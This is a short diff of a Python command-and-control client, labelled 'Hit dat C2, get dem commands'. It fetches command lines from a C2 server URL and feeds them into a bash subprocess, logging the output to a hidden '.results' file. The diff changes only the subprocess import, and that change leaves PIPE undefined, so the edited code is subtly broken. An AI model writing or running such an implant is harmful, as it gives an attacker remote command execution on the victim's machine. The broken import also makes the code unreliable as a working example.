@@ -4,7 +4,7 @@ Hit dat C2, get dem commands
 def main():
     import socket
     import sys
-    from subprocess import *
+    import subprocess
 
     server = "127.0.0.1:5000"    # C2 IP:port
 
@@ -19,7 +19,7 @@ def main():
         import urllib
     code = urllib.urlopen(cb_url).readlines()
     out = open(".results","w")
-    p = Popen("bash", stdin=PIPE, stdout=out, stderr=out)
+    p = subprocess.Popen("bash", stdin=PIPE, stdout=out, stderr=out)
     for line in code:
         p.stdin.write(line)
     p.communicate()
